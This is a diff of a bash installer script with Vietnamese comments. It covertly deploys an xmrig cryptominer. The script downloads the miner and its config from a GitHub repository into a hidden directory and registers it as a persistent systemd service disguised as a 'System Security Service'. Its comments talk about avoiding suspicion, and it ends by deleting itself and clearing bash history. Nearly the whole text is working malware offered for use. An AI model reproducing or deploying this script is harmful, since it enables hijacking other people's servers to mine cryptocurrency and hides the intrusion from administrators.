@@ -1,32 +1,63 @@
-systemctl stop sys_update.service 2>/dev/null
-systemctl disable sys_update.service 2>/dev/null
+#!/bin/bash
 
+# 1. Kiểm tra quyền root (Chỉ chạy khi có quyền cao nhất)
+if [[ $EUID -ne 0 ]]; then
+   exit 1
+fi
 
-mkdir -p /var/opt/.system_lib
+# 2. Định nghĩa biến để dễ quản lý và thay đổi nhanh
+SERVICE_NAME="sys_update"
+DISPLAY_NAME="System Security Service"
+INSTALL_DIR="/usr/lib/.sys_cache"
+EXEC_NAME="sys_mgr"
+CONF_URL="https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json"
+BIN_URL="https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig"
 
-curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -o /var/opt/.system_lib/config.json
-curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /var/opt/.system_lib/sys_update
+# 3. Dọn dẹp dấu vết của các phiên bản cũ (nếu có)
+systemctl stop $SERVICE_NAME.service 2>/dev/null
+systemctl disable $SERVICE_NAME.service 2>/dev/null
+rm -rf $INSTALL_DIR
 
-chmod +x /var/opt/.system_lib/sys_update
+# 4. Tạo môi trường ẩn
+mkdir -p $INSTALL_DIR
 
-cat <<EOF > /etc/systemd/system/sys_update.service
+# 5. Tải file với cờ -s (silent) và -L (follow redirect)
+curl -sL $CONF_URL -o $INSTALL_DIR/config.json
+curl -sL $BIN_URL -o $INSTALL_DIR/$EXEC_NAME
+
+# 6. Cấp quyền thực thi
+chmod +x $INSTALL_DIR/$EXEC_NAME
+
+# 7. Tạo Service Systemd (Tối ưu để khởi động lại và ẩn danh)
+cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
 [Unit]
-Description=System Security Service
-After=network.target
+Description=$DISPLAY_NAME
+After=network.target network-online.target
+Wants=network-online.target
 
 [Service]
 Type=simple
-ExecStart=/var/opt/.system_lib/sys_update --config=/var/opt/.system_lib/config.json
+# Sử dụng WorkingDirectory để file log/temp không văng ra ngoài
+WorkingDirectory=$INSTALL_DIR
+ExecStart=$INSTALL_DIR/$EXEC_NAME --config=$INSTALL_DIR/config.json
 Restart=always
-RestartSec=10
+RestartSec=15
+# Giới hạn tài nguyên để không gây nghi ngờ (tùy chọn)
+# CPUQuota=50%
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
+# 8. Kích hoạt hệ thống
 systemctl daemon-reload
-systemctl enable sys_update
-systemctl start sys_update
+systemctl enable $SERVICE_NAME.service >/dev/null 2>&1
+systemctl start $SERVICE_NAME.service
 
+# 9. Xóa sạch dấu vết cài đặt
+# Xóa script cài đặt hiện tại sau khi chạy xong
+rm -- "$0"
+
+# Xóa lịch sử bash ngay lập tức
+cat /dev/null > ~/.bash_history
 history -c
-
